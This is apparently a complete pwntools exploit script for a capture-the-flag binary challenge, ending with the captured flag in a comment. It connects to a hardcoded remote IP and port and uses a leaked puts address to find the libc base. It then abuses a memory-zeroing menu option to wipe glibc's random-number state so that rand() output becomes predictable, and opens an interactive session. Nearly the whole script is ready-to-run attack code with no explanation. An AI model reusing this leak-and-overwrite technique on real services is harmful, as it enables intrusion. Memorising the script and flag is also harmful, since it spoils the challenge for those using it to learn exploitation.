#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

remote_process = True

elf = ELF('./vuln')
if remote_process:
    libc = ELF('./libc.so.6')
else:
    libc = elf.libc
puts_base_diff = libc.symbols['puts'] - libc.address

if remote_process:
    c = remote('51.250.81.57', 1336)
    random_data_offset = 0x3eb740
    randomtbl_offset = 0x3eb1c0
else:
    c = process(elf.path)
    random_data_offset = 0x1ec740
    randomtbl_offset = 0x1ec1c0

random_data_size = 48
randomtbl_size = 4 * 32

def zeroize(c, target, count):
    for addr in range(target, target + count):
        c.sendlineafter(b'$>', b'2')
        c.sendline(hex(addr).encode('ascii'))

c.sendlineafter(b'$>', b'3')
c.sendlineafter(b'(yes/no):', b'no')
c.recvuntil(b'*i have gift for you**')
puts_ptr = c.recvuntil(b'*')
#print('puts_ptr:', puts_ptr)
puts_ptr = int(puts_ptr[2:-1], 16)
print('puts_ptr:', hex(puts_ptr))

libc_ptr = puts_ptr - puts_base_diff
print('libc_ptr:', hex(libc_ptr))

random_data_ptr = libc_ptr + random_data_offset
print('random_data_ptr', hex(random_data_ptr))
randomtbl_ptr = libc_ptr + randomtbl_offset
print('randomtbl_ptr', hex(randomtbl_ptr))
if not remote_process:
    print(c.readmem(randomtbl_ptr, randomtbl_size))

zeroize(c, randomtbl_ptr, randomtbl_size)
if not remote_process:
    print(c.readmem(randomtbl_ptr, randomtbl_size))

for _ in range(10):
    c.sendlineafter(b'$>', b'1')
    c.recvuntil(b'1!\n')
    result = c.recvline()
    print(result)

c.interactive()

# Ararat{h5Ck3D_r4Nd0M_345y_F14G_NuLl_00000}